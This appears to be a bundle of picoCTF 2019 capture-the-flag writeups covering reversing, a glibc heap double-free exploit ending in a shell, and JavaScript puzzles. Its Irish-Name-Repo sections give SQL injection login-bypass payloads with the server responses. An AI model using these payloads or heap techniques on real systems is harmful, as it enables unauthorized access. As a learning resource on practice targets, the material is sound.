<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-amacb
description: CTF writeups and security challenges by AMACB.
---

# Writeups by AMACB

Source repository: `/repos/AMACB`

## Repository Index

- picoCTF-2019-writeups/README.md
- picoCTF-2019-writeups/problems/B1g_Mac/README.md
- picoCTF-2019-writeups/problems/Ghost_Diary/README.md
- picoCTF-2019-writeups/problems/Irish-Name-Repo_1/README.md
- picoCTF-2019-writeups/problems/Irish-Name-Repo_2/README.md
- picoCTF-2019-writeups/problems/Irish-Name-Repo_3/README.md
- picoCTF-2019-writeups/problems/Java-Script-Kiddie-2/README.md
- picoCTF-2019-writeups/problems/Java-Script-Kiddie/README.md
- picoCTF-2019-writeups/problems/aes-abc/README.md
- picoCTF-2019-writeups/problems/investigation_encoded_1/README.md
- picoCTF-2019-writeups/problems/investigation_encoded_2/README.md
- picoCTF-2019-writeups/problems/john_pollard/README.md
- picoCTF-2019-writeups/problems/like1000/README.md
- picoCTF-2019-writeups/problems/pastaAAA/README.md
- picoCTF-2019-writeups/problems/picobrowser/README.md
- picoCTF-2019-writeups/problems/shark-on-wire-2/README.md
- picoCTF-2019-writeups/problems/sice_cream/README.md
- picoCTF-2019-writeups/problems/times-up-again/README.md
- picoCTF-2019-writeups/problems/times-up-for-the-last-time/README.md
- picoCTF-2019-writeups/problems/times-up/README.md
- picoCTF-2019-writeups/problems/whats-the-difference/README.md
- picoCTF-2019-writeups/problems/zero_to_hero/README.md

## Writeup Content


### File: picoCTF-2019-writeups/README.md

# picoCTF 2019 Writeups

Hello from team dry roasted peanuts! These are our writeups for picoCTF 2019.

| **Problem** | **Points** | **Category** |
|-------------|------------|--------------|
| The Factory's Secret | 1 | General Skills |
| 2Warm | 50 | General Skills |
| Glory of the Garden | 50 | Forensics |
| Insp3ct0r | 50 | Web Exploitation |
| Lets Warm Up | 50 | General Skills |
| The Numbers | 50 | Cryptography |
| Warmed Up | 50 | General Skills |
| handy-shellcode | 50 | Binary Exploitation |
| practice-run-1 | 50 | Binary Exploitation |
| unzip | 50 | Forensics |
| vault-door-training | 50 | Reverse Engineering |
| 13 | 100 | Cryptography |
| Bases | 100 | General Skills |
| Easy1 | 100 | Cryptography |
| First Grep | 100 | General Skills |
| OverFlow 0 | 100 | Binary Exploitation |
| Resources | 100 | General Skills |
| caesar | 100 | Cryptography |
| dont-use-client-side | 100 | Web Exploitation |
| logon | 100 | Web Exploitation |
| strings it | 100 | General Skills |
| vault-door-1 | 100 | Reverse Engineering |
| what's a net cat? | 100 | General Skills |
| where are the robots | 100 | Web Exploitation |
| OverFlow 1 | 150 | Binary Exploitation |
| So Meta | 150 | Forensics |
| What Lies Within | 150 | Forensics |
| extensions | 150 | Forensics |
| shark on wire 1 | 150 | Forensics |
| Based | 200 | General Skills |
| Client-side-again | 200 | Web Exploitation |
| First Grep: Part II | 200 | General Skills |
| Flags | 200 | Cryptography |
| Mr-Worldwide | 200 | Cryptography |
| NewOverFlow-1 | 200 | Binary Exploitation |
| Open-to-admins | 200 | Web Exploitation |
| Tapping | 200 | Cryptography |
| asm1 | 200 | Reverse Engineering |
| la cifra de | 200 | Cryptography |
| [picobrowser](problems/picobrowser) | 200 | Web Exploitation |
| plumbing | 200 | General Skills |
| rsa-pop-quiz | 200 | Cryptography |
| slippery-shellcode | 200 | Binary Exploitation |
| vault-door-3 | 200 | Reverse Engineering |
| [whats-the-difference](problems/whats-the-difference) | 200 | General Skills |
| where-is-the-file | 200 | General Skills |
| NewOverFlow-2 | 250 | Binary Exploitation |
| OverFlow 2 | 250 | Binary Exploitation |
| WhitePages | 250 | Forensics |
| asm2 | 250 | Reverse Engineering |
| c0rrupt | 250 | Forensics |
| [like1000](problems/like1000/) | 250 | Forensics |
| m00nwalk | 250 | Forensics |
| vault-door-4 | 250 | Reverse Engineering |
| CanaRy | 300 | Binary Exploitation |
| Investigative Reversing 0 | 300 | Forensics |
| [Irish-Name-Repo 1](problems/Irish-Name-Repo_1) | 300 | Web Exploitation |
| asm3 | 300 | Reverse Engineering |
| droids0 | 300 | Reverse Engineering |
| flag_shop | 300 | General Skills |
| leap-frog | 300 | Binary Exploitation |
| m00nwalk2 | 300 | Forensics |
| messy-malloc | 300 | Binary Exploitation |
| miniRSA | 300 | Cryptography |
| mus1c | 300 | General Skills |
| reverse_cipher | 300 | Reverse Engineering |
| [shark on wire 2](problems/shark-on-wire-2) | 300 | Forensics |
| stringzz | 300 | Binary Exploitation |
| vault-door-5 | 300 | Reverse Engineering |
| waves over lambda | 300 | Cryptography |
| 1_wanna_b3_a_r0ck5tar | 350 | General Skills |
| GoT | 350 | Binary Exploitation |
| Investigative Reversing 1 | 350 | Forensics |
| Investigative Reversing 2 | 350 | Forensics |
| [Irish-Name-Repo 2](problems/Irish-Name-Repo_2) | 350 | Web Exploitation |
| WebNet0 | 350 | Forensics |
| droids1 | 350 | Reverse Engineering |
| [pastaAAA](problems/pastaAAA/) | 350 | Forensics |
| pointy | 350 | Binary Exploitation |
| seed-sPRiNG | 350 | Binary Exploitation |
| vault-door-6 | 350 | Reverse Engineering |
| [AES-ABC](problems/aes-abc/) | 400 | Cryptography |
| AfterLife | 400 | Binary Exploitation |
| B1ll_Gat35 | 400 | Reverse Engineering |
| Empire1 | 400 | Web Exploitation |
| Investigative Reversing 3 | 400 | Forensics |
| Investigative Reversing 4 | 400 | Forensics |
| [Irish-Name-Repo 3](problems/Irish-Name-Repo_3) | 400 | Web Exploitation |
| JaWT Scratchpad | 400 | Web Exploitation |
| [Java Script Kiddie](problems/Java-Script-Kiddie) | 400 | Web Exploitation |
| L1im1tL355 | 400 | Binary Exploitation |
| Need For Speed | 400 | Reverse Engineering |
| SecondLife | 400 | Binary Exploitation |
| [Time's Up](problems/times-up) | 400 | Reverse Engineering |
| asm4 | 400 | Reverse Engineering |
| b00tl3gRSA2 | 400 | Cryptography |
| droids2 | 400 | Reverse Engineering |
| rop32 | 400 | Binary Exploitation |
| rop64 | 400 | Binary Exploitation |
| vault-door-7 | 400 | Reverse Engineering |
| Empire2 | 450 | Web Exploitation |
| Heap overflow | 450 | Binary Exploitation |
| [Java Script Kiddie 2](problems/Java-Script-Kiddie-2) | 450 | Web Exploitation |
| [Time's Up, Again!](problems/times-up-again) | 450 | Reverse Engineering |
| WebNet1 | 450 | Forensics |
| b00tl3gRSA3 | 450 | Cryptography |
| cereal hacker 1 | 450 | Web Exploitation |
| droids3 | 450 | Reverse Engineering |
| [investigation_encoded_1](problems/investigation_encoded_1) | 450 | Forensics |
| vault-door-8 | 450 | Reverse Engineering |
| [B1g_Mac](problems/B1g_Mac) | 500 | Forensics |
| Empire3 | 500 | Web Exploitation |
| Forky | 500 | Reverse Engineering |
| [Ghost_Diary](problems/Ghost_Diary) | 500 | Binary Exploitation |
| [Time's Up, For the Last Time!](problems/times-up-for-the-last-time) | 500 | Reverse Engineering |
| cereal hacker 2 | 500 | Web Exploitation |
| droids4 | 500 | Reverse Engineering |
| [investigation_encoded_2](problems/investigation_encoded_2) | 500 | Forensics |
| [john_pollard](problems/john_pollard) | 500 | Cryptography |
| [sice_cream](problems/sice_cream/) | 500 | Binary Exploitation |
| [zero_to_hero](problems/zero_to_hero/) | 500 | Binary Exploitation |



### File: picoCTF-2019-writeups/problems/B1g_Mac/README.md

# B1g_Mac

> Here's a [zip file](b1g_mac.zip). You can also find the file in `/problems/b1g-mac_0_ac4b0dbedcd3b0f0097a5f056e04f97a`.

Inside the given zip file, we find a windows binary `main.exe` and a folder named `test` with 18 bitmap images inside. We suspect that the images contain some sort of data encoded by `main.exe`, so our first goal is to reverse this binary. Ghidra was quite useful in this process, and we can make out for the most part what the program is doing from it alone. However, it fails to identify certain functions (calling them `.text`), so we can also use Ollydbg to figure out what these function are (`sprintf`, `printf`, etc.).
```c
bool _isOver;
int _pLevel;
char _folderName [8];

int _main() {
	char buf [50];
	FILE* flagfile;
	_isOver = 0;
	_pLevel = 0;
	flagfile = fopen("flag.txt","r");
	if (flagfile == NULL) {
		puts("No flag found, please make sure this is run on the server");
	}
	if (fread(buf,1,18,flagfile) < 1) {
		exit(0);
	}
	_folderName = "./test"
	_flag = buf;
	_flag_size = 18;
	int i = 0;
	_flag_index = &i;
	puts("Work is done!");
	_listdir(0,_folderName);
	puts("Wait for 5 seconds to exit.");
	sleep(5);
	return 2;
}

void _listdir(int mode, char* folderName) {
	char buf [2048];
	_WIN32_FIND_DATAA file_data;
	HANDLE file_handle;
	file_handle = NULL;
	bool shouldAct = true;
	sprintf(buf, "%s\\*.*", folderName);
	file_handle = FindFirstFileA(buf, &file_data);
	if (file_handle == -1) {
		printf("Path not found: [%s]\n", folderName);
	} else {
		do {
			if (strcmp(file_data.cFileName,".") != 0 && strcmp(file_data.cFileName,"..") != 0) {
				sprintf(buf,"%s\\%s",folderName,file_data.cFileName);
				if ((file_data.dwFileAttributes & 0x10) == 0) {
					if (shouldAct) {
						// Note: mode is always 0, so _hideInFile is always called
						if (mode == 0) {
							_hideInFile(buf);
						} else if (mode == 1) {
							_decodeBytes(buf);
						}
					}
					shouldAct = !shouldAct;
				} else {
					printf("Folder: %s\n",buf);
					hideindir(mode,buf);
				}
			}
			if (_isOver) break;
			FindClose(file_handle);
		} while (FindNextFileA(file_handle,&file_data));
	} 
}

void _hideInFile(char* filename) {
	LPFILETIME creation_time, last_access_time, last_write_time;
	char tmp1, tmp2;
	HANDLE file_handle;
	
	file_handle = CreateFileA(filename,0x100,0,NULL,3,0,NULL);
	changeFileTime(file_handle);
	if (file_handle == -1) {
		printf("Error:INVALID_HANDLED_VALUE");
	} else {
		if (!GetFileTime(file_handle,&creation_time,&last_access_time,&last_write_time)) {
			printf("Error: C-GFT-01");
		} else {
			tmp1 = _flag[*_flag_index];
			(*_flag_index) ++;
			tmp2 = _flag[*_flag_index];
			(*_flag_index) ++;
			_encodeBytes(tmp1, tmp2, &last_write_time);
			// Note: _pLevel is always 0, so the below can two blocks have no effect
			if (0 < _pLevel) {
				tmp1 = _flag[*_flag_index];
				(*_flag_index) ++;
				tmp2 = _flag[*_flag_index];
				(*_flag_index) ++;
				_encodeBytes(tmp1, tmp2, &creation_time);
			}
			if (_pLevel == 2) {
				tmp1 = _flag[*_flag_index];
				(*_flag_index) ++;
				tmp2 = _flag[*_flag_index];
				(*_flag_index) ++;
				_encodeBytes(tmp1, tmp2, &last_access_time);
			}
			if (!SetFileTime(file_handle,&creation_time,&last_access_time,&last_write_time)) {
				printf("Error: C-SFT-01");
			}
			else {
				if (_flag_size <= *_flag_index) {
					_isOver = true;
				}
				CloseHandle(file_handle);
			}
		}
	}
}
void _encodeBytes(char c1, char c2, unsigned int* target) {
	*target = (*target & 0xffff0000) + c2 + c1*0x100;
}
void changeFileTime(HANDLE file) {
	SetFileTime(file,NULL,_ftLeaveUnchanged,NULL);
}

void _decodeBytes(char* filename) {
	// we don't actually need to reverse this function because it isn't used
}
```
There are several Windows API functions that we might not be familiar with: [`FindFirstFileA`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilea), [`FindNextFileA`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextfilea), [`CreateFileA`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea), [`CloseHandle`](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle), [`GetFileTime`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfiletime), and [`SetFileTime`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfiletime). The first two allow iteration through files in a directory. The third and fourth are essentially eqiuvalent to `fopen` and `fclose`, but return a type `HANDLE`, which allows for other I/O operations to be performed. In particular, `GetFileTime` and `SetFileTime` allow (via a `HANDLE` type) the reading and writing of a file's creation time, last access time, and last write time. We suspect that the data is encoded into these file times.

Reading the code confirms our suspicion. For each file in the directory `./test` (actually, every other file, and thus only the `'Copy'` files), two bytes of ASCII are written into the least significant two bytes of the last write time. We also should note the datatype being used, [`FILETIME`](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime). This datatype represents the number of `100` nanosecond intervals since January 1, 1601 UTC, also known as the [LDAP format](https://www.epochconverter.com/ldap).

To actually extract this data, we have to be careful not to inadvertantly change the file times in the zip. On Windows, we can use `7-zip` to open and extract these files without modifying their file times. Actually viewing the times to the precision we need is quite an annoyance, however. The Windows `Properties` dialogue rounds to the nearest minute; `7-zip` rounds to the nearest second.  We need to see microsecond-level precision. To solve this, we can use the `stat` command in the [Cygwin](https://cygwin.com/) shell. (There are certainly [other ways](https://superuser.com/a/937401/) to get the file time resolution we need, but this one worked simply and quickly). For instance:

```
$ stat 'Item 01 - Copy.bmp'
...
Modify: 2019-03-25 18:20:08.002775300 -0500
...
```
If we convert this into an integer in the LDAP format, we get `131980296080027753`, or `0x1d4e36149337069`. Aha! Those last two bytes are `pi` in ASCII. We continue this process on all of the `'Copy'` files and concatenate them to get our flag:

> `picoCTF{M4cTim35!}`


### File: picoCTF-2019-writeups/problems/Ghost_Diary/README.md

# Ghost_Diary

> Try writing in this [ghost diary](ghostdiary). It's also found in `/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578` on the shell server.

Even though our team's original solution used a technique with overlapping chunks, this write-up will feature a separate solution utilizing an untried idea suggested before the problem was solved. As the idea was independently generated, motivation is provided.

In one sentence, this exploit uses a poison-null overflow to trigger a back-consolidation in order to put an already-free chunk onto a freelist twice.

We are given a stripped 64-bit binary called `ghostdiary` as well as a directory on the shell server. Checking the libc version on the server gives us version `2.27` (which is the standard version for Ubuntu systems as of writing). Let's also do a `checksec`:
```
[*] '/.../ghostdiary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
It looks like everything is enabled, so we have quite the task ahead of us. After running, we are given a menu with the following options: `New page`, `Talk with ghost`, `Listen to ghost`, `Burn the page`, and `Go to sleep`. We suspect that these operations correspond to a fairly standard heap problem with `create`, `edit`, `read`, `delete`, and `exit`. We, as always, then begin attacking the problem by reversing the binary. The full pseudocode can be found [here](ghost_diary.c).

Running the standard checks on stupid exploits is rather unfruitful. The ``delete_page`` method correctly sets the pointer to ``NULL`` after freeing, so any use-after-free exploit will have to work nontrivially.

So what do we have? After sufficient staring, the key bug can be found in the ``edit_page_input`` method:
```c
void edit_page_input(struct page p) {
	unsigned int i = 0;
	if (p.size != 0) {
		for (; i != p.size; i++)
...
		p.content[i] = '\x00'; // OFF BY ONE BUG
	}
}
```
Indeed, the program does no checks on the location of where it places the last null byte it uses to terminate the inputted string into the page. I.e., this null byte could overflow past the data of the chunk, and because of the organization of chunks in the heap, this could in theory overflow the size and prev-in-use metadata in the next chunk. Let's keep this in mind.

We are using libc 2.27, and tcache in libc 2.27 is even more dangerous than usual, so philosophically, it would be nice to get a double-free with one of the frees on tcache, as this will give us [the most arbitrary of writes](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c). Notably, having a double-free with a free on tcache will let us coerce tcache into handing malloc an arbitrary pointer and letting us write there using typical double-free techniques.

However, the program also gives us 20 mallocs before the program complains, which is enough to overcome the number of chunks allowed in one size of a tcache linked list. If the only solution only placed chunks onto the tcache, then there would likely be a limitation to 6 mallocs as seen in zero_to_hero. But conversely, if the only solution purely used the old non-tcache free, then we probably would have been handed an older version of libc, as in sice_cream. So we are probably going to end up using both the free onto tcache and free onto one of the various older freed linked lists.

Alright, the only tool we currently have is that null-byte overflow, and altering the size of a chunk generally does not matter much to tcache or the malloc freed linked lists; recall after a pointer is freed once, it gets removed, so alterations of size will not allow us to get that pointer back to free it. This leaves us with corrupting the prev-in-use bit. The following would be the set up.
```
[chunk 1]: 0x0000000000000000 0x0000000000000121 <- size = 0x121, prev-in-use bit set
           0x0000000000000000 0x0000000000000000
           ...
[chunk 2]: 0x0000000000000000 0x0000000000000101 <- size = 0x100, prev-in-use bit set
           ...
```
Then so far our unfinished exploit looks would have us overflow to write ``0x00`` into the metadata, as such.
```
[chunk 1]: 0x0000000000000000 0x0000000000000121 <- size = 0x121, prev-in-use bit set
           0xdeadbeefdeadbeef 0xdeadbeefdeadbeef
           ...
[chunk 2]: 0xdeadbeefdeadbeef 0x0000000000000100 <- size = 0x100, prev-in-use bit not set!
           ...
```
Now, tcache does not care about the prev-in-use bit (it only cares about size for which freed linked list to place in), so if we want to abuse this corruption, we have to use the older freed linked lists. However, with the prev-in-use bit unset, the prev-size portion of ``chunk 2`` will now be checked in order for ``free`` to figure out where the previous chunk is, so we change the setup to the following.
```
[chunk 1]: 0x0000000000000000 0x0000000000000121 <- size = 0x121, prev-in-use bit set
           0xdeadbeefdeadbeef 0xdeadbeefdeadbeef
           ...
[chunk 2]: 0x0000000000000120 0x0000000000000100 <- size = 0x100, prev-in-use bit not set!
           ...
```
Ok, so after overcoming tcache, what does freeing ``chunk 2`` look like? Here is the corresponding code from malloc.c's ``free``.
```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
    ...
```
The chunk corresponding to ``p``, which at the beginning would be``chunk 2`` but is later set to ``chunk 1``, is then thrown onto the unsorted chunk freed linked list. Observe that this is a bit dangerous: This backwards consolidation does  no checks on whether the previous chunk has already been freed and instead simply calls ``unlink`` and throws it onto the unsorted freelist, with no further questions asked. This is exploitable. Indeed, if we were to place the previous chunk onto tcache and then somehow coerce the ``unlink`` macro into doing the rough equivalent of nothing, this chunk gets placed onto both freed linked lists simultaneously with minimal checks. This grants us our double-free and so our arbitrary write.

As the finishing sidenote, we do have to think a bit to overcome the ``unlink`` macro because of its ``P->fd->bk == P`` checks, especially because we want the ``chunk 1`` to already be freed onto the tcache freed linked list, and tcache does place a pointer at ``P->fd``. To fix this, we add another chunk before ``chunk 1`` to complete the set-up.
```
[chunk 0]: 0x0000000000000000 0x0000000000000121
           0x0000000000000000 0x0000000000000000
	   0x[ptr to chunk 1] 0x[ptr to chunk 1] <- we set both chunk 0 ptr->fd and ->bk to chunk 1
	   ...
[chunk 1]: 0x0000000000000000 0x0000000000000121
           0x[ptr to chunk 0] 0x[ptr to chunk 0] <- we set both fd and bk to point to chunk 0
           ...
[chunk 2]: 0x0000000000000120 0x0000000000000100
           ...
```
Under this configuration, freeing ``chunk 0`` and then ``chunk 1`` onto tcache will add a pointer to ``chunk 0`` where there already is one and so not immediately change the configuration. However, the resulting ``unlink`` call will check if ``chunk 1 -> ptr to chunk 0 -> pointer to chunk 1 = chunk 1``, and of course we can check that it does. This completes the key ideas of the exploit.

Breifly, the above requires a heap leak. This is not hard to come by because, as we stated above, tcache stores heap addresses in its freed linked list, so we may simply request one of these chunks back and read in the address.

From here the rest of the exploit is details. The usual finish from arbitrary write is to write into, say, ``__free_hook`` to a ``one_gadget`` in order to get a shell. Both finding the location in code of both of these pointers will require a libc leak, but this is relatively easy to come by because any chunk placed into the unsorted chunk freed linked list (such as the one described above) will be part of a doubly-linked list whose head is stored in libc. Thus, when we ask for chunk back from the unsorted chunk freed linked list, w can simply read off the libc address still stored in its contents. In this way we can write directly to ``__free_hook`` to call our ``one_gadget`` and get our shell.

The full code, with comments added, can be found in [exploit.py](exploit.py). And as fruits for our labors, we bring the flag home:
> ``picoCTF{nu11_byt3_Gh05T_82783d57}``



### File: picoCTF-2019-writeups/problems/Irish-Name-Repo_1/README.md

# Irish-Name-Repo 1

> There is a website running at ``https://2019shell1.picoctf.com/problem/12273/`` ([link](https://2019shell1.picoctf.com/problem/12273/)) or http://2019shell1.picoctf.com:12273. Do you think you can log us in? Try to see if you can login!

> Hints: There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database? Try to think about how does the website verify your login?

As suggested by the hints, this is a SQL injection, the language most commonly assocaited with database searches.

Navigating to the [login page](https://2019shell1.picoctf.com/problem/12273/login.html) and inspecting, we find that there is a hidden input to the POST request named ``debug``.
```html
<form action="login.php" method="POST">
    <fieldset>
        ...
        <input type="hidden" name="debug" value="0">

        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```
Entering something random in for the username and password and then setting the ``debug`` to ``1`` greets us with the following invalid login page.
<pre>
username: something random
password: something random
SQL query: SELECT * FROM users WHERE name='something random' AND password='something random'
<h1>Login failed.</h1>
</pre>
So indeed, this is a SQL injection. Currently, the SQL querry looks like the following.
```sql
SELECT * FROM users WHERE name='something random' AND password='something random'
```
We note that if we inject ``' OR 1=1 --``, the poor sanitation that SQL works with on strings will cause the querry to close the string on ``'`` and then evaluate the ``OR 1=1``, which is always true. We then kindly comment out the rest of the querry with ``--``. Formatted, the injection looks like this.
```sql
SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
```

Inputting the injection greets us with the flag.
<pre>
username: ' OR 1=1 --
password: something random
SQL query: SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_34865514}</p>
</pre>
> ``picoCTF{s0m3_SQL_34865514}``



### File: picoCTF-2019-writeups/problems/Irish-Name-Repo_2/README.md

# Irish-Name-Repo 2

> There is a website running at ``https://2019shell1.picoctf.com/problem/41025/`` ([link](https://2019shell1.picoctf.com/problem/41025/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://2019shell1.picoctf.com:41025

> Hints: The password is being filtered.

First things first, we try the same injection we did last time in [Irish-Name-Repo 1](/problems/Irish-Name-Repo_1).
<pre>
username: ' OR 1=1 --
password: something random
SQL query: SELECT * FROM users WHERE name='' OR 1=1 --' AND password='something random'
<h1>SQLi detected.</h1>
</pre>
Darn: It's detecting something in the username that does not pass the check. Quickly, we check if we can run the injection at all by removing the helpful ``OR`` statement.
<pre>
username: ' --
password: something random
SQL query: SELECT * FROM users WHERE name='' --' AND password='something random'
<h1>Login failed.</h1>
</pre>
This is passing the filter, so we can indeed do some injection. Now, running through some [standard injections](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/), we find the idea ``admin' --``, which tries to abuse the fact that our current injection ``' --`` causes the ``password`` check to be completely bypassed:
```sql
SELECT * FROM users WHERE name='' --' AND password='something random'
```
So if the admin's username is ``admin``, the suggested injection ``admin' --`` will return the ``admin`` user without having to check the pesky password.
```sql
SELECT * FROM users WHERE name='admin' --' AND password='something random'
```
Testing this gives the flag.
<pre>
username: admin' --
password: something random
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='something random'
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_83dad972}</p>
</pre>
> ``picoCTF{m0R3_SQL_plz_83dad972}``



### File: picoCTF-2019-writeups/problems/Irish-Name-Repo_3/README.md

# Irish-Name-Repo 3

> There is a secure website running at ``https://2019shell1.picoctf.com/problem/47247/`` ([link](https://2019shell1.picoctf.com/problem/47247/)) or http://2019shell1.picoctf.com:47247. Try to see if you can login as admin!

> Hints: Seems like the password is encrypted.

Connecting the login page, this time we see that we only have a password entry. Thinking wishfully, we try the injection from the first challenge, ``' OR 1=1 --``. We receive the following bare page.
<pre>
password: ' OR 1=1 --
SQL query: SELECT * FROM admin where password = '' BE 1=1 --'
</pre>
While we didn't get the login, at least we're not failing some kind of filter. But strangely, the string ``OR`` was changed to ``BE``, which must be the encryption suggested by the hint.

Testing the waters, trying a stupid injection such as ``' AND 1=1 --`` (that shouldn't even work) gives us the following page.
```
password: ' AND 1=1 --
SQL query: SELECT * FROM admin where password = '' NAQ 1=1 --'
```
This appears to be some kind of substituion cipher (letters go to letters, not gibberish as with modern encryption schemes), so we just throw in the whole alphabet.
<pre>password: ABCDEFGHIJKLMNOPQRSTUVWXYZ
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLM'
<h1>Login failed.</h1>
</pre>
Aha, this is a substitution cipher, namely ROT13, which shifts over all characters by 13. Importantly, the cipher is its own inverse (shifting by 13 twice shifts by 26, which is not at all), explaining why the ``AN`` in ``AND`` just became ``NA``. It follows that the injection ``' BE 1=1 --`` should get turned back into ``' OR 1=1 --``. Inputting this retrieves the flag.
<pre>password: ' BE 1=1 --
SQL query: SELECT * FROM admin where password = '' OR 1=1 --'
<h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p>
</pre>
Thankfully, there was no SQL filter this time around, and we instead have our flag.
> ``picoCTF{3v3n_m0r3_SQL_c2c37f5e}``



### File: picoCTF-2019-writeups/problems/Java-Script-Kiddie-2/README.md

# Java Script Kiddie 2

> The image link appears broken... twice as badly... https://2019shell1.picoctf.com/problem/37897 or http://2019shell1.picoctf.com:37897
> Hints: This is only a JavaScript problem.

This problem is very similar to [Java Script Kiddie](/problems/Java-Script-Kiddie), so we recommend reading that writeup first. Just like the previous one, we have a textbox and a submit button. The javascript is slightly different:

```js
var bytes = [];
$.get("bytes", function(resp) {
	bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in){
	var LEN = 16;
	var key = "00000000000000000000000000000000";
	var shifter;
	if(u_in.length == key.length){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i < LEN; i++){
		shifter = Number(key.slice((i*2),(i*2)+1));
		for(var j = 0; j < (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
	document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
	return false;
}
```
The AJAX query for [`bytes`](bytes.txt) is identical, although the data is obviously different. The rest of the program is nearly the same in that `bytes` is used as a 2D array with 16 columns. However, we notice the key is twice as long: the key now takes two digits for each column to determine how much to shift. We can write a similar python script for visualization purposes:

```python
def tohex(a):
	return "{:02x}".format(a)

f = open("bytes.txt", "r")
bytelist = map(int, f.read().split(" "))
f.close()

key = "00000000000000000000000000000000"
result = [0 for x in bytelist]
SIZE = 16
for i in range(SIZE):
	shift = int(key[i*2:(i+1)*2])
	for j in range(len(result) / SIZE):
		result[(j*SIZE + i)] = bytelist[(((j+shift)*SIZE) % len(bytelist)) + i]

for i in range(len(result) / SIZE):
	print ' '.join(map(tohex, result[i*SIZE:(i+1)*SIZE]))
```
Just as in the previous problem, we must have the first row look like this:
```
89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52
```
Additionally, we can use the constraints of the second row as in the previous problem. Thus, we determine the key will be of the form `010600050109030600AABB0101050600` where `AA = 06,07` and `BB = 04,05`. By testing each of the four options, we find that the key is `01060005010903060007050101050600`, which gives us the following QR code:

![QR Code](qr.png "QR Code")

The QR [decodes](https://zxing.org/w/decode.jspx) to the flag:

> `picoCTF{9064bc1bb5f8b7bd526686a311bfc18c}`


### File: picoCTF-2019-writeups/problems/Java-Script-Kiddie/README.md

# Java Script Kiddie

> The image link appears broken... https://2019shell1.picoctf.com/problem/37826 or http://2019shell1.picoctf.com:37826.
> Hints: This is only a JavaScript problem.

Upon accessing the site, we find a textbox with a submit button next to it. When we press submit, a placeholder image icon appears. We suspect that inputting a correct password into the box will make the image valid. Let's inspect the javascript, given that this is a JS-only problem by the hint:

```js
var bytes = [];
$.get("bytes", function(resp) {
	bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in){
	var LEN = 16;
	var key = "0000000000000000";
	var shifter;
	if(u_in.length == LEN){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i < LEN; i++){
		shifter = key.charCodeAt(i) - 48;
		for(var j = 0; j < (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
	document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
	return false;
}
```
We note the AJAX query for `bytes`. Accessing `https://2019shell1.picoctf.com/problem/37826/bytes` gives us a large array of [bytes](bytes.txt) represented as integers. We also read the code to see that `bytes` is treated as a 2D array with 16 columns; each column is shifted by the corresponding value in `key`. (For instance, if the third digit in `key` is `7`, then the third column is shifted down by `7`). We can write a python script to help visualize this:

```python
def tohex(a):
	return "{:02x}".format(a)

f = open("bytes.txt", "r")
bytelist = map(int, f.read().split(" "))
f.close()

key = "0000000000000000"
result = [0 for x in bytelist]
SIZE = 16
for i in range(SIZE):
	shift = ord(key[i]) - 48
	for j in range(len(result) / SIZE):
		result[(j*SIZE + i)] = bytelist[(((j+shift)*SIZE) % len(bytelist)) + i]

for i in range(len(result) / SIZE):
	print ' '.join(map(tohex, result[i*SIZE:(i+1)*SIZE]))
```
As output, we get:
```
35 48 9b 0e 0c 0a b7 0a f8 17 fd 0c fc 00 00 4e
1b 9f e1 74 82 00 72 72 e6 c0 c5 81 7f 48 44 00
17 4a ef cc 0d 49 00 41 f1 1d 00 21 17 c0 5f 52
44 97 93 1b 00 24 1a 1b f6 fe 00 54 00 4d 6e 6c
89 13 6f 60 4c 44 01 e5 00 23 00 8b 00 06 39 9c
00 4b fa 47 05 bd 44 20 00 31 00 00 49 43 e3 52
a4 8f 99 72 03 14 2f 88 01 e2 9c 00 00 ea 17 c8
40 6b 3c 02 1d ab 82 8e 54 00 c8 0d 9b f1 e2 30
ae ae 42 5f f8 5b 5a e4 c9 00 97 00 e0 cc ac df
